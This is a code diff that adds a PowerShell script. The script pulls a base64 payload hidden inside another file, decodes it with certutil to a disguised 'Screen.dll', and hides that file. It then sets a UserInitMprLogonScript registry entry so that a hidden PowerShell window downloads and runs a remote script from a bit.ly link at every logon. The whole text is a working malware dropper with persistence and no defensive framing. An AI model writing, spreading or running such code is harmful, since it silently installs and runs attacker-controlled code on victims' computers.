@@ -1,0 +1,13 @@
+$filename = $args[0];
+$base64 = $env:TEMP + "\Base64.dll";
+$curl = "C:\Users\" + $env:Username + "\Screen.dll";
+$read = Get-Content $filename;
+$data = ($read -Split "/*!Split\*/")[-1];
+Set-Content ($env:TEMP + "\Base64.dll") $data;
+certutil -decode $base64 $curl;
+echo certutil -decode $base64 $curl;
+Remove-Item $base64 -Recurse;
+(Get-Item $curl).Attributes += "System";
+(Get-Item $curl).Attributes += "Hidden";
+$command = "cmd.exe /c ""powershell.exe -WindowStyle Hidden cmd.exe /c C:\Users\" + $env:Username + "\Screen.dll -k -L https://bit.ly/3m9LrJR -o %temp%\Down-X.ps1 & powershell.exe %temp%\Down-X.ps1""";
+New-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $command -Force;
